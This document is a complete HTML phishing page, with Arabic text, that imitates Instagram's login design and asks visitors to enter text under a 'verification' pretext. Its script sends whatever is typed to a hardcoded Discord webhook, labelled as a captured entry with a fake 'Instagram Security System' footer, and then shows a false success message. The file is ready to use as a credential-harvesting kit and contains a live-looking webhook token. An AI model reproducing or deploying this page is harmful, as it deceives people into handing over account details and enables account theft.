<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }

        .background-avatars {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 1;
            overflow: hidden;
            opacity: 0.25;
            pointer-events: none;
        }
        .avatar-circle {
            position: absolute;
            border-radius: 50%;
            background-size: cover;
            background-position: center;
            border: 3px solid white;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }
        .avatar-1 { width: 80px; height: 80px; top: 10%; left: 15%; background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150'); }
        .avatar-2 { width: 70px; height: 70px; top: 70%; left: 10%; background-image: url('https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150'); }
        .avatar-3 { width: 90px; height: 90px; top: 20%; right: 15%; background-image: url('https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150'); }
        .avatar-4 { width: 75px; height: 75px; top: 65%; right: 12%; background-image: url('https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=150'); }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
            border-radius: 8px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
            z-index: 2;
            position: relative;
        }

        .instagram-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 30px;
        }
        .instagram-icon {
            width: 50px;
            height: 50px;
            margin-bottom: 10px;
            fill: url(#instagram-gradient);
        }
        .instagram-title {
            font-family: 'Billabong', cursive, sans-serif;
            font-size: 36px;
            font-weight: bold;
            color: #262626;
        }
        input {
            width: 100%;
            padding: 10px 12px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            margin-bottom: 10px;
            box-sizing: border-box;
            font-size: 14px;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 9px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 5px;
            font-size: 14px;
            transition: background 0.2s;
        }
        button:hover {
            background-color: #1877f2;
        }
    </style>
</head>
<body>

    <div class="background-avatars">
        <div class="avatar-circle avatar-1"></div>
        <div class="avatar-circle avatar-2"></div>
        <div class="avatar-circle avatar-3"></div>
        <div class="avatar-circle avatar-4"></div>
    </div>

    <svg width="0" height="0">
        <linearGradient id="instagram-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
            <stop offset="0%" stop-color="#fdf497" />
            <stop offset="5%" stop-color="#fdf497" />
            <stop offset="45%" stop-color="#fd5949" />
            <stop offset="60%" stop-color="#d6249f" />
            <stop offset="90%" stop-color="#285AEB" />
        </linearGradient>
    </svg>

    <div class="login-container">
        <div class="instagram-header">
            <svg class="instagram-icon" viewBox="0 0 24 24">
                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
            </svg>
            <div class="instagram-title">Instagram</div>
        </div>
        
        <form id="prankForm">
            <input type="text" id="userInput" placeholder="ضع هنا لتوثيق ..." required>
            <button type="submit">إرسال</button>
        </form>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1546868216847143023/Ho_GWHPORbUe6WxSh-PhVT6qavnppxjzItM-w9DDcUs2iKXYbN1LZox_kMn_AOG-KQbw";

        document.getElementById('prankForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const textValue = document.getElementById('userInput').value;

            // تم إزالة الصورة الجانبية وحطيت أيقونة انستغرام بدالها
            const discordData = {
                embeds: [{
                    title: "📸 تم التقاط مدخل جديد!",
                    description: "تم إرسال النص بنجاح  .",
                    color: 13853304,
                    fields: [
                        {
                            name: "💬 النص المدخل:",
                            value: `\`\`\`${textValue}\`\`\``,
                            inline: false
                        }
                    ],
                    author: {
                        name: "Instagram Notification",
                        icon_url: "https://cdn-icons-png.flaticon.com/512/174/174855.png"
                    },
                    thumbnail: {
                        url: "https://cdn-icons-png.flaticon.com/512/174/174855.png"
                    },
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Instagram Security System",
                        icon_url: "https://cdn-icons-png.flaticon.com/512/174/174855.png"
                    }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordData)
            })
            .then(response => {
                if (response.ok) {
                    alert('تم توثيق بنجاح!');
                    document.getElementById('userInput').value = '';
                } else {
                    alert('حدث خطأ أثناء الإرسال.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>

</body>
</html>
